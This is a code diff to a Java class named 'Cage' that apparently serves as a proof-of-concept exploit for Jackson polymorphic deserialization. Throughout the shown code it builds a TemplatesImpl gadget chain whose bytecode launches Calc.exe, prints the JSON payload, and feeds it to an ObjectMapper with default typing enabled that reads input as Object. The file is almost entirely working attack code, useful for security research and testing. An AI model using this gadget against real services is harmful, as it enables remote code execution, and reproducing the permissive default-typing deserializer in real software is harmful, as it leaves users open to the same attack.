@@ -22,7 +22,6 @@
 
 package jackson;
 
-import com.fasterxml.jackson.core.JsonProcessingException;
 import com.fasterxml.jackson.databind.ObjectMapper;
 
 import java.io.IOException;
@@ -40,15 +39,10 @@ import java.util.Map.Entry;
 
 public class Cage {
 
-  private static String marshal(Object o) throws JsonProcessingException {
+  private static Object deserialize(String data) throws IOException {
     ObjectMapper mapper = new ObjectMapper();
     mapper.enableDefaultTyping();
-    return mapper.writeValueAsString(o);
-  }
-
-  private static Object unmarshal(String data) throws IOException {
-    ObjectMapper mapper = new ObjectMapper();
-    mapper.enableDefaultTyping();
+    // deserialize as Object or permissive tag interfaces such as java.io.Serializable
     return mapper.readValue(data, Object.class);
   }
 
@@ -101,7 +95,7 @@ public class Cage {
   public static String rcePayload() throws
       IllegalAccessException, ClassNotFoundException, InstantiationException, CannotCompileException,
       NotFoundException, IOException, NoSuchFieldException, NoSuchMethodException, InvocationTargetException {
-    String[] args = { "Calc.exe" };
+    String[] args = {"Calc.exe"};
     Object tpl = TemplatesUtil.createTemplatesImpl(args);
     byte[][] bytecodes = (byte[][]) Reflections.getFieldValue(tpl, "_bytecodes");
     Map<String, String> values = new LinkedHashMap<>();
@@ -115,16 +109,16 @@ public class Cage {
     return writeObject("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl", values);
   }
 
-    public static void main(String[] args) throws
-        IllegalAccessException, ClassNotFoundException, InstantiationException, CannotCompileException,
-        NotFoundException, IOException, NoSuchFieldException, NoSuchMethodException, InvocationTargetException {
+  public static void main(String[] args) throws
+      IllegalAccessException, ClassNotFoundException, InstantiationException, CannotCompileException,
+      NotFoundException, IOException, NoSuchFieldException, NoSuchMethodException, InvocationTargetException {
     Properties props = System.getProperties();
-    // props.setProperty("upstreamXalan", "true");
+    props.setProperty("upstreamXalan", "true");
 
-    String[] command = {"Calc.exe"};
-    // Object tpl = TemplatesUtil.createTemplatesImpl(command);
-    // Object obj = unmarshal(marshal(tpl))
-    Object obj = unmarshal(rcePayload());
+    // Writes gadget by hand and then deserializes using unmarshal
+    String json = rcePayload();
+    System.out.println(json);
+    Object obj = deserialize(json);
     Class cls = obj.getClass();
     System.out.println("The type of the object is: " + cls.getName());
     System.out.println(obj);
